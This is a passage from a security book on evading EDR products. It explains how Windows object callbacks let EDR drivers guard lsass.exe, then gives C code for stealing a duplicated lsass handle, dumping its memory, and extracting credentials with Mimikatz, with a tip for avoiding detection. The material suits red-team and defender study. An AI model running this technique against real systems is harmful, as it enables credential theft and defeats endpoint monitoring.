Image name: WdFilter.sys
Browse all global symbols functions data
Image was built with /Brepro flag.
Timestamp: 
629E0677 (This is a reproducible build file hash, not a timestamp)
CheckSum: 
0006EF0F
ImageSize: 
00072000
Translations: 
0000.04b0 0000.04e4 0409.04b0 0409.04e4
Information from resource tables:
Listing 4-6: Enumerating pre-operation callbacks for process-handle operations
This debugger command essentially says, “Traverse the linked list  
starting at the address pointed to by the CallbackList member of the  
nt!_OBJECT_TYPE structure for nt!PsProcessType, printing out the module infor-
mation if the address pointed to by the PreOperation member is not null.”
On my test system, Defender’s WdFilter.sys 1 is the only driver with a reg-
istered callback. On a real system with an EDR deployed, you will almost cer-
tainly see the EDR’s driver registered alongside Defender. You can use the 
same process to enumerate callbacks that monitor thread- or desktop-handle 
operations, but those are usually far less common. Additionally, if Microsoft 
were to add the ability to register callbacks for other types of object-handle 
operations, such as for tokens, this process could enumerate them as well.
Detecting a Driver’s Actions Once Triggered
While you’ll find it useful to know what types of objects an EDR is interested in 
monitoring, the most valuable piece of information is what the driver actually 
does when triggered. An EDR can do a bunch of things, from silently observing 
the code’s activities to actively interfering with requests. To understand what 
the driver might do, we first need to look at the data with which it works.
When some handle operation invokes a registered callback, the call-
back will receive a pointer to either an OB_PRE_OPERATION_INFORMATION struc-
ture, if it is a pre-operation callback, or an OB_POST_OPERATION_INFORMATION 
structure, if it is a post-operation routine. These structures are very similar, 
but the post-operation version contains only the return code of the handle 
operation, and its data can’t be changed. Pre-operation callbacks are far 
more prevalent because they offer the driver the ability to intercept and 
modify the handle operation. Therefore, we’ll focus our attention on the 
pre-operation structure, shown in Listing 4-7.
typedef struct _OB_PRE_OPERATION_INFORMATION {
  OB_OPERATION 
Operation;
  union {
ULONG Flags;
struct {
ULONG KernelHandle : 1;
ULONG Reserved : 31;
Evading EDR (Early Access) © 2023 by Matt Hand
Object Notifications   67
};
  };
  PVOID 
Object;
  POBJECT_TYPE 
ObjectType;
  PVOID 
CallContext;
  POB_PRE_OPERATION_PARAMETERS Parameters;
} OB_PRE_OPERATION_INFORMATION, *POB_PRE_OPERATION_INFORMATION;
Listing 4-7: The OB_PRE_OPERATION_INFORMATION structure definition
Just like the process of registering the callback, parsing the notifica-
tion data is a little more complex than it looks. Let’s step through the 
important pieces together. First, the Operation handle identifies whether 
the operation being performed is the creation of a new handle or the 
duplication of an existing one. An EDR’s developer can use this handle 
to take different actions based on the type of operation it is processing. 
Also, if the KernelHandle value isn’t zero, the handle is a kernel handle, and 
a callback function will rarely process it. This allows the EDR to further 
reduce the scope of events that it needs to monitor to provide effective 
coverage.
The Object pointer references the handle operation’s target. The driver 
can use it to further investigate this target, such as to get information about 
its process. The ObjectType pointer indicates whether the operation is target-
ing a process or a thread, and the Parameters pointer references a structure 
that indicates the type of operation being processed (either handle creation 
or duplication).
The driver uses pretty much everything in this structure leading up to 
the Parameters member to filter the operation. Once it knows what type of 
object it is working with and what types of operations it will be processing, it 
will rarely perform additional checks beyond figuring out whether the han-
dle is a kernel handle. The real magic begins once we start processing the 
structure pointed to by the Parameters member. If the operation is for the 
creation of a new handle, we’ll receive a pointer to the structure defined in 
Listing 4-8.
typedef struct _OB_PRE_CREATE_HANDLE_INFORMATION {
  ACCESS_MASK DesiredAccess;
  ACCESS_MASK OriginalDesiredAccess;
} OB_PRE_CREATE_HANDLE_INFORMATION, *POB_PRE_CREATE_HANDLE_INFORMATION;
Listing 4-8: The OB_PRE_CREATE_HANDLE_INFORMATION structure definition
The two ACCESS_MASK values both sp+ecify the access rights to grant to 
the handle. These might be set to values like PROCESS_VM_OPERATION or THREAD_
SET_THREAD_TOKEN, which code might pass to kernel functions in the  
dwDesiredAccess parameter when opening a process or thread.
You may be wondering why this structure contains two copies of the 
same value. Well, the reason is that pre-operation notifications give the 
driver the ability to modify requests. Let’s say the driver wants to prevent 
processes from reading the memory of the lsass.exe process. To read that 
Evading EDR (Early Access) © 2023 by Matt Hand
68   Chapter 4
process’s memory, the attacker would first need to open a handle with 
the appropriate rights, so they might request PROCESS_ALL_ACCESS. The 
driver would receive this new process-handle notification and see the 
requested access mask in the structure’s OriginalDesiredAccess member. 
To prevent the access, the driver could remove PROCESS_VM_READ by flipping 
the bit associated with this access right in the DesiredAccess member using 
the bitwise complement operator (~). Flipping this bit stops the handle 
from gaining that particular right but allows it to retain all the other 
requested rights.
If the operation is for the duplication of an existing handle, we’ll 
receive a pointer to the structure defined in Listing 4-9, which includes two 
additional pointers.
typedef struct _OB_PRE_DUPLICATE_HANDLE_INFORMATION {
  ACCESS_MASK DesiredAccess;
  ACCESS_MASK OriginalDesiredAccess;
  PVOID 
SourceProcess;
  PVOID 
TargetProcess;
} OB_PRE_DUPLICATE_HANDLE_INFORMATION, *POB_PRE_DUPLICATE_HANDLE_INFORMATION;
Listing 4-9: The OB_PRE_DUPLICATE_HANDLE_INFORMATION structure definition
The SourceProcess member is a pointer to the process object from 
which the handle originated, and TargetProcess is a pointer to the pro-
cess receiving the handle. These match the hSourceProcessHandle and 
hTargetProcessHandle parameters passed to the handle-duplication kernel 
function.
Evading Object Callbacks During an Authentication Attack
Undeniably one of the processes that attackers target most often is lsass.
exe, which is responsible for handling authentication in user mode. Its 
address space may contain cleartext authentication credentials that attack-
ers can extract with tools such as Mimikatz, ProcDump, and even the Task 
Manager.
Because attackers have targeted lsass.exe so extensively, security vendors 
have invested considerable time and effort into detecting its abuse. Object-
callback notifications are one of their strongest data sources for this pur-
pose. To determine whether activity is malicious, many EDRs rely on three 
pieces of information passed to their callback routine on each new process-
handle request: the process from which the request was made, the process 
for which the handle is being requested, and the access mask, or the rights 
requested by the calling process.
For example, when an operator requests a new process handle to 
lsass.exe, the EDR’s driver will determine the identity of the calling pro-
cess and check whether the target is lsass.exe. If so, it might evaluate the 
requested access rights to see whether the requestor asked for PROCESS_VM_
READ, which it would need to read process memory. Next, if the requestor 
Evading EDR (Early Access) © 2023 by Matt Hand
Object Notifications   69
doesn’t belong to a list of processes that should be able to access lsass.exe, 
the driver might opt to return an invalid handle or one with a modified 
access mask and notify the agent of the potentially malicious behavior.
N O T E 
Defenders can sometimes identify specific hacking tools based on the access masks 
requested. Many offensive tools request excessive access masks, such as PROCESS_ALL_
ACCESS, or atypical ones, such as Mimikatz’s request for PROCESS_VM_READ | PROCESS_
QUERY_LIMITED_INFORMATION, when opening process handles.
In summary, an EDR makes three assumptions in its detection strategy: 
that the calling process will open a new handle to lsass.exe, that the process 
will be atypical, and that the requested access mask will allow the requestor 
to read lsass.exe’s memory. Attackers might be able to use these assumptions 
to bypass the detection logic of the agent.
Performing Handle Theft
One way that attackers can evade detection is to duplicate a handle to lsass.
exe owned by another process. They can discover these handles through the 
ntdll!NtQuerySystemInformation() API, which provides an incredibly useful 
feature: the ability to view the system’s handle table as an unprivileged user. 
This table contains a list of all the handles open on the systems, including 
objects such as mutexes, files, and, most importantly, processes. Listing 4-10 
shows how malware might query this API.
PSYSTEM_HANDLE_INFORMATION GetSystemHandles()
{
NTSTATUS status = STATUS_SUCCESS;
PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
ULONG ulSize = sizeof(SYSTEM_HANDLE_INFORMATION);
pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(ulSize);
if (!pHandleInfo)
{
return NULL;
}
status = NtQuerySystemInformation(
1 SystemHandleInformation,
pHandleInfo,
ulSize, &ulSize);
while (status == STATUS_INFO_LENGTH_MISMATCH)
{
free(pHandleInfo);
pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(ulSize);
status = NtQuerySystemInformation(
SystemHandleInformation, 1
2 pHandleInfo,
ulSize, &ulSize);
}
Evading EDR (Early Access) © 2023 by Matt Hand
70   Chapter 4
if (status != STATUS_SUCCESS)
{
return NULL;
}
}
Listing 4-10: Retrieving the table of handles
By passing the SystemHandleInformation information class to this function 
1, the user can retrieve an array containing all the active handles on the 
system. After this function completes, it will store the array in a member 
variable of the SYSTEM_HANDLE_INFORMATION structure 2.
Next, the malware could iterate over the array of handles, as shown in 
Listing 4-11, and filter out those it can’t use.
for (DWORD i = 0; i NumberOfHandles; i++)
{
SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleInfo->Handles[i];
 1 if (handleInfo.UniqueProcessId != g_dwLsassPid && handleInfo.UniqueProcessId != 4)
{
HANDLE hTargetProcess = OpenProcess(
PROCESS_DUP_HANDLE,
FALSE,
handleInfo.UniqueProcessId);
if (hTargetProcess == NULL)
{
continue;
}
HANDLE hDuplicateHandle = NULL;
if (!DuplicateHandle(
hTargetProcess,
(HANDLE)handleInfo.HandleValue,
GetCurrentProcess(),
&hDuplicateHandle,
0, 0, DUPLICATE_SAME_ACCESS))
{
continue;
}
status = NtQueryObject(
hDuplicateHandle,
ObjectTypeInformation,
NULL, 0, &ulReturnLength);
if (status == STATUS_INFO_LENGTH_MISMATCH)
{
PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInfo =
(PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(ulReturnLength);
if (!pObjectTypeInfo)
{
break;
}
Evading EDR (Early Access) © 2023 by Matt Hand
Object Notifications   71
status = NtQueryObject(
hDuplicateHandle,
 2 ObjectTypeInformation,
pObjectTypeInfo,
ulReturnLength,
&ulReturnLength);
if (status != STATUS_SUCCESS)
{
continue;
}
3 if (!_wcsicmp(pObjectTypeInfo->TypeName.Buffer, L"Process"))
{
--snip--
}
free(pObjectTypeInfo);
}
}
}
Listing 4-11: Filtering only for process handles
We first make sure that neither lsass.exe nor the system process owns 
the handle 1, as this could trigger some alerting logic. We then call 
ntdll!NtQueryObject(), passing in ObjectTypeInformation 2 to get the type 
of the object to which the handle belongs. Following this, we determine 
whether the handle is for a process object 3 so that we can filter out all 
the other types, such as files and mutexes.
After completing this basic filtering, we need to investigate the 
 handles a little more to make sure they have the access rights that we 
need to dump process memory. Listing 4-12 builds upon the previous 
code listing.
if (!_wcsicmp(pObjectTypeInfo->TypeName.Buffer, L"Process"))
{
LPWSTR szImageName = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
DWORD dwSize = MAX_PATH * sizeof(WCHAR);
 1 if (QueryFullProcessImageNameW(hDuplicateHandle, 0, szImageName, &dwSize))
{
if (IsLsassHandle(szImageName) &&
(handleEntryInfo.GrantedAccess & PROCESS_VM_READ) == PROCESS_VM_READ &&
(handleEntryInfo.GrantedAccess & PROCESS_QUERY_INFORMATION) ==
PROCESS_QUERY_INFORMATION)
{
HANDLE hOutFile = CreateFileW(
L"C:\\lsa.dmp",
GENERIC_WRITE,
0,
NULL,
CREATE_ALWAYS,
0, NULL);
Evading EDR (Early Access) © 2023 by Matt Hand
72   Chapter 4
2 if (MiniDumpWriteDump(
hDuplicateHandle,
dwLsassPid,
hOutFile,
MiniDumpWithFullMemory,
NULL, NULL, NULL))
{
break;
}
CloseHandle(hOutFile);
}
}
}
Listing 4-12: Evaluating duplicated handles and dumping memory
We first get the image name for the process 1 and pass it to an internal 
function, IsLsassHandle(), which makes sure that the process handle is for 
lsass.exe. Next, we check the handle’s access rights, looking for PROCESS_VM 
_READ and PROCESS_QUERY_INFORMATION, because the API we’ll use to read  
lsass.exe’s process memory requires these. If we find an existing handle to 
lsass.exe with the required access rights, we pass the duplicated handle  
to the API and extract its information 2.
Using this new handle, we could create and process an lsass.exe 
 memory dump with a tool such as Mimikatz. Listing 4-13 shows this 
workflow.
C:\> HandleDuplication.exe
LSASS PID: 884
[+] Found a handle with the required rights!
 Owner PID: 17600
 Handle Value: 0xff8
 Granted Access: 0x1fffff
[>] Dumping LSASS memory to the DMP file . . .
[+] Dumped LSASS memory C:\lsa.dmp
C:\> mimikatz.exe
mimikatz # sekurlsa::minidump C:\lsa.dmp
Switch to MINIDUMP : 'C:\lsa.dmp'
mimikatz # sekurlsa::logonpasswords
Opening : 'C:\lsa.dmp' file for minidump . . .
Authentication Id : 0 ; 6189696 (00000000:005e7280)
Session 
: RemoteInteractive from 2
User Name 
: highpriv
Domain 
: MILKYWAY
Logon Server 
: SUN
--snip--
Listing 4-13: Dumping lsass.exe’s memory and processing the minidump with Mimikatz
Evading EDR (Early Access) © 2023 by Matt Hand
Object Notifications   73
As you can see, our tool determines that PID 17600, which cor-
responds to Process Explorer on my test host, had a handle to lsass.exe 
with the PROCESS_ALL_ACCESS access mask (0x1FFFFF). We use this handle 
to dump the memory to a file, C:\lsa.dmp. Next, we run Mimikatz and 
use it to process the file, then extract credential material using the 
sekurlsa::logonpasswords command. Note that we could perform these 
Mimikatz steps off-target to reduce our risk of detection, as we’re working 
with a file and not live memory.